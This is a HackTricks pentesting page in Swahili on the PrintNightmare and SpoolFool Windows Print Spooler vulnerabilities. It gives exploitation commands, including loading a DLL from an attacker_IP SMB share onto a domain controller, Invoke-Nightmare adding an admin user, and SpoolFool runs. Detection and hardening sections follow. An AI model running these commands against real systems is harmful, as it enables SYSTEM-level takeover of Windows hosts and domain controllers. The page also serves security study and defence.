# PrintNightmare (Windows Print Spooler RCE/LPE)

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmare ni jina la jumla la kundi la udhaifu katika huduma ya **Print Spooler** ya Windows unaoruhusu **utekelezaji wa msimbo wowote kama SYSTEM** na, Spooler inapofikiwa kupitia RPC, **utekelezaji wa msimbo wa mbali (RCE) kwenye domain controllers na file servers**. CVE zilizotumiwa zaidi ni **CVE-2021-1675** (mwanzoni iliainishwa kama LPE) na **CVE-2021-34527** (RCE kamili). Masuala yaliyofuata, kama **CVE-2021-34481 (“Point & Print”)** na **CVE-2022-21999 (“SpoolFool”)**, yanathibitisha kuwa eneo la mashambulizi bado halijazibwa kikamilifu.

Ikiwa unatafuta **kulazimisha uthibitishaji / relay** kupitia spooler badala ya **RCE/LPE inayotegemea driver**, angalia [ukurasa huu mwingine kuhusu matumizi mabaya ya printer coercion](printers-spooler-service-abuse.md). Ukurasa huu unalenga **kupakia drivers / DLLs kama SYSTEM**.

---

## 1. Vipengele vilivyo hatarini na CVE

| Year | CVE | Short name | Primitive | Notes |
|------|-----|------------|-----------|-------|
|2021|CVE-2021-1675|“PrintNightmare #1”|LPE|Ilirekebishwa katika CU ya Juni 2021 lakini ikakwepwa na CVE-2021-34527|
|2021|CVE-2021-34527|“PrintNightmare”|RCE/LPE|`AddPrinterDriverEx` huruhusu watumiaji walioidhinishwa kupakia driver DLL kutoka kwenye remote share; baada ya Agosti 2021, kwa kawaida hili huhitaji sera dhaifu za Point & Print|
|2021|CVE-2021-34481|“Point & Print”|LPE|Usakinishaji wa driver isiyosainiwa na watumiaji wasio admin|
|2022|CVE-2022-21999|“SpoolFool”|LPE|Uundaji wa directory yoyote → upandikizaji wa DLL – hufanya kazi baada ya patches za 2021|

Zote zinatumia vibaya mojawapo ya **mbinu za MS-RPRN / MS-PAR RPC** (`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) au mahusiano ya uaminifu ndani ya **Point & Print**.

## 2. Mbinu za exploitation

### 2.1 Kuingilia Domain Controller ya mbali (CVE-2021-34527)

Mtumiaji wa domain aliyeidhinishwa lakini **asiye na ruhusa za juu** anaweza kuendesha DLL yoyote kama **NT AUTHORITY\SYSTEM** kwenye spooler ya mbali (mara nyingi DC) kwa:

```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
       -f \
       '\\attacker_IP\share\evil.dll'
```

PoCs maarufu ni pamoja na **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#) na modules za Benjamin Delpy `misc::printnightmare / lsa::addsid` katika **mimikatz**.

### 2.2 Local privilege escalation (Windows yoyote inayotumika, 2021-2024)

API hiyo hiyo inaweza kuitwa **ndani ya mfumo** ili kupakia driver kutoka `C:\Windows\System32\spool\drivers\x64\3\` na kupata privileges za SYSTEM:

```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```

### 2.3 Uchunguzi wa awali wa kisasa kwenye host zilizopata masasisho

Kwenye host iliyosasishwa kikamilifu, PrintNightmare PoCs za umma mara nyingi hushindwa kwa sababu Windows sasa huweka chaguomsingi ya usakinishaji wa driver za printer kuwa **kwa wasimamizi pekee** (`RestrictDriverInstallationToAdministrators=1` tangu Agosti 10, 2021). Kabla ya kujaribu exploit kwenye target, kwanza hakikisha kama mazingira yalirudisha nyuma mabadiliko hayo ya usalama kwa ajili ya deployment za printer za zamani:<sup>[[3]](#references)</sup>

```cmd
reg query "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
```

Thamani mbili dhaifu zinazovutia zaidi kwa kawaida ni:<sup>[[3]](#references)</sup>

- `RestrictDriverInstallationToAdministrators = 0`
- `NoWarningNoElevationOnInstall = 1`

Kutoka Linux, thibitisha haraka kuwa target inaonyesha print RPC interfaces husika kabla ya kuendesha PoC:

```bash
rpcdump.py @TARGET | egrep 'MS-RPRN|MS-PAR'
```

Baadhi ya zana mpya zaidi zinazopatikana hadharani pia hukupa mtiririko salama zaidi wa **kukagua/kuorodhesha** kabla ya kutuma DLL:

```bash
python3 printnightmare.py -check 'DOMAIN/user:Password@TARGET'
python3 printnightmare.py -list  'DOMAIN/user:Password@TARGET'
```

> Ukipata `RPC_E_ACCESS_DENIED` (`0x8001011b`) ukiwa mtumiaji mwenye haki chache, kwa kawaida unaona hali chaguomsingi ya baada ya 2021 badala ya hitilafu ya usafirishaji.

> Kwenye Windows 11 22H2+ na matoleo mapya zaidi ya client, uchapishaji wa mbali hutumia **RPC over TCP** kwa chaguomsingi, na **RPC over named pipes** (`\PIPE\spoolss`) imezimwa isipokuwa iwashwe tena waziwazi. Baadhi ya PoC za zamani na madokezo ya maabara bado hudhani kuwa named pipe inaweza kufikiwa.<sup>[[4]](#references)</sup>

### 2.4 Matumizi mabaya ya Package Point & Print kwenye mitandao “iliyofanyiwa viraka”

Mazingira mengi ya biashara yaliendelea **kuwa hatarini kutokana na sera** hata baada ya viraka vya awali vya 2021 kwa sababu michakato ya helpdesk au print-server bado ilihitaji watumiaji wasio wasimamizi kusakinisha/kusasisha drivers. Kwa vitendo, mkakati wa mashambulizi huwa:

- Ikiwa vidokezo vya usalama vimezimwa kabisa, **classic arbitrary-DLL PrintNightmare** bado ndiyo njia fupi zaidi.
- Ikiwa `Only use Package Point and Print` imewashwa, kwa kawaida unahitaji kuelekeza mashambulizi kwenye njia ya driver **inayotambua package na iliyotiwa saini** badala ya kuweka DLL ghafi.<sup>[[3]](#references)</sup>
- Utafiti wa 2024 ulionyesha kuwa **`Package Point and Print - Approved servers` si mpaka thabiti wa uaminifu peke yake**: ikiwa mshambuliaji anaweza kughushi au kuteka nyara utatuzi wa majina kwa print server moja iliyoidhinishwa, waathiriwa bado wanaweza kuelekezwa kwenye server hasidi inayokidhi ukaguzi wa sera.<sup>[[4]](#references)</sup>
- Hata kuchanganya uimarishaji wa UNC na kulazimisha RPC-over-SMB kunaweza kutokuwa thabiti kwa sababu clients za kisasa zinaweza **kurudi kwenye RPC over TCP**.<sup>[[4]](#references)</sup>

Ndiyo maana unyonyaji wa kisasa wa mtindo wa PrintNightmare mara nyingi huhusu zaidi **matumizi mabaya ya sera za usambazaji wa printa za biashara** kuliko kurudia PoC ya awali ya 2021 bila mabadiliko.

### 2.5 SpoolFool (CVE-2022-21999) – kukwepa marekebisho ya 2021

Viraka vya Microsoft vya 2021 vilizuia upakiaji wa driver wa mbali lakini **havikuimarisha ruhusa za saraka**. SpoolFool hutumia vibaya kigezo cha `SpoolDirectory` kuunda saraka holela chini ya `C:\Windows\System32\spool\drivers\`, huweka payload DLL, kisha hulazimisha spooler kuipakia:<sup>[[2]](#references)</sup>

```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```

> Exploit inafanya kazi kwenye Windows 7 → Windows 11 na Server 2012R2 → 2022 zilizopata masasisho yote, kabla ya masasisho ya Februari 2022<sup>[[2]](#references)</sup>

---

## 3. Utambuzi na utafutaji wa vitisho

* **Kumbukumbu za PrintService** – washa channel ya *Microsoft-Windows-PrintService/Operational* na ufuatilie **Event ID 316** (driver imeongezwa/imesasishwa, kwa kawaida hujumuisha majina ya DLL) kwa majaribio yaliyofaulu na yaliyoshindwa. Iunganishe na **Event ID 808/811** kwa hitilafu zinazotia shaka za kupakia module/driver za spooler.
* **Sysmon** – `Event ID 7` (Image loaded) au `11/23` (File write/delete) ndani ya `C:\Windows\System32\spool\drivers\*` pale mchakato mzazi unapokuwa **spoolsv.exe**.
* **Mfuatano wa michakato** – toa tahadhari kila **spoolsv.exe** inapozindua `cmd.exe`, `rundll32.exe`, PowerShell au mchakato wowote wa mtoto usiotarajiwa na usio na sahihi.
* **Telemetry ya mtandao** – SMB fetch zisizotarajiwa kutoka kwa **spoolsv.exe** kwenda kwenye shares zinazodhibitiwa na mshambuliaji, au trafiki isiyo ya kawaida ya printer RPC kutoka kwa seva ambazo hazipaswi kufanya kazi kama print servers, ni vidokezo muhimu vya kuchunguza.

## 4. Kupunguza hatari na kuimarisha usalama

1. **Weka viraka!** – Tumia sasisho la hivi karibuni la jumla kwenye kila Windows host iliyo na huduma ya Print Spooler iliyosakinishwa.
2. **Zima spooler pale ambapo haihitajiki**, hasa kwenye Domain Controllers:
   ```powershell
   Stop-Service Spooler -Force
   Set-Service Spooler -StartupType Disabled
   ```
3. **Zuia miunganisho ya mbali** huku uchapishaji wa ndani ukiendelea kuruhusiwa – Group Policy: `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`.
4. **Weka Point & Print kwa wasimamizi pekee** kwa kuweka:
   ```cmd
   reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
           /v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
   ```
   Mwongozo wa kina katika Microsoft KB5005652<sup>[[1]](#references)</sup>
5. Ikiwa mahitaji ya biashara yanalazimisha `RestrictDriverInstallationToAdministrators=0`, chukulia kila sera nyingine ya printa kama **kinga ya sehemu tu**. Angalau, pendelea **package-aware drivers**, washa **Only use Package Point and Print**, na uweke **Package Point and Print - Approved servers** iwe na seva za printa zilizo wazi tu ndani ya forest.<sup>[[3]](#references)</sup>
6. **Usirudishe nyuma ulinzi wa faragha wa printer RPC** kwa sababu tu ya kurekebisha mapping za printa zilizoharibika. Mazingira yanayoweka `RpcAuthnLevelPrivacyEnabled=0` yanabatilisha hardening iliyoongezwa kwa ajili ya **CVE-2021-1678**, na kwa kawaida yanahitaji uchunguzi wa ziada wakati wa engagement.<sup>[[4]](#references)</sup>

---

## 5. Utafiti / zana zinazohusiana

* modules za [mimikatz `printnightmare`](https://github.com/gentilkiwi/mimikatz/tree/master/modules)
* [`ly4k/PrintNightmare`](https://github.com/ly4k/PrintNightmare) – utekelezaji wa kawaida wa Impacket wenye modes za `-check`, `-list`, na `-delete`
* [`m8sec/CVE-2021-34527`](https://github.com/m8sec/CVE-2021-34527) – wrapper yenye SMB delivery iliyojengewa ndani, usaidizi wa targets nyingi, na modes za `MS-RPRN` / `MS-PAR`
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* [`Concealed Position`](https://github.com/jacob-baines/concealed_position) – matumizi mabaya ya printa driver yenye udhaifu uliyo nayo kupitia package Point & Print
* exploit na write-up ya SpoolFool
* micropatches za 0patch kwa SpoolFool na hitilafu nyingine za spooler

Ikiwa unataka **kulazimisha authentication** kupitia spooler badala ya kupakia driver, nenda kwenye [matumizi mabaya ya huduma ya printer spooler](printers-spooler-service-abuse.md).

---

## References

- [1] [Microsoft – KB5005652: Dhibiti tabia mpya ya usakinishaji chaguomsingi wa driver ya Point & Print](https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872)
- [2] [Oliver Lyak – SpoolFool: CVE-2022-21999](https://github.com/ly4k/SpoolFool)
- [3] [itm4n – Mwongozo wa vitendo wa PrintNightmare mwaka 2024](https://itm4n.github.io/printnightmare-exploitation/)
- [4] [itm4n – PrintNightmare bado haijaisha](https://itm4n.github.io/printnightmare-not-over/)
{{#include ../../banners/hacktricks-training.md}}
